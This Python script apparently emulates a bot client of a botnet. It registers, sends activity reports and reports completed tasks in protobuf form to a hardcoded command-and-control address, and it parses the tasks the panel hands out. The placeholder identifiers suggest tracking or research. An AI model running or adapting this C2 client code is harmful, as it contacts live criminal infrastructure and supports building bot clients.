import requests

import bot_pb2
import struct
from io import StringIO
from stem import Signal
from stem.control import Controller
import urllib3


hash = '16:159C137829EB08E660D8A30A6B5DAB55167C2465231B40440FDB12591A'



bot = bot_pb2.BotMsg.RegisterBot()
bot.uid = 'ruserv'.encode('utf-16-le')
bot.computername = '12dczczc3'.encode('utf-16-le')
bot.username = '1232czc3'.encode('utf-16-le')
bot.os_major = 10
bot.os_minor = 0
bot.is_x64 = True
bot.is_server = True


#r = requests.post(url='http://185.250.151.137/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())
#print(r.content)

#_r = bot_pb2.PanelMsg.RegistrationResult()
#_r.ParseFromString(r.content)
#print(_r)

ar = bot_pb2.BotMsg.ActivityReport()
ar.uid = 'ruserv'.encode('utf-16-le')

r1 = requests.post(url='http://185.250.151.137/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
b = bot_pb2.PanelMsg.TaskGiveaway()

b.ParseFromString(r1.content)
print(b.is_empty, b.task.task_id.decode('utf-16-le'), b.task.server, b.task.port, 'activ rep')

task = bot_pb2.BotMsg.TaskCompleted()
task.task_id = '43'.encode('utf-16-le')
task.result = True
task.uid = 'ruserv'.encode('utf-16-le')

r2 = requests.post(url='http://185.250.151.137:80/gate/', data=struct.pack('=I', 3) + task.SerializeToString())
print(r2.text)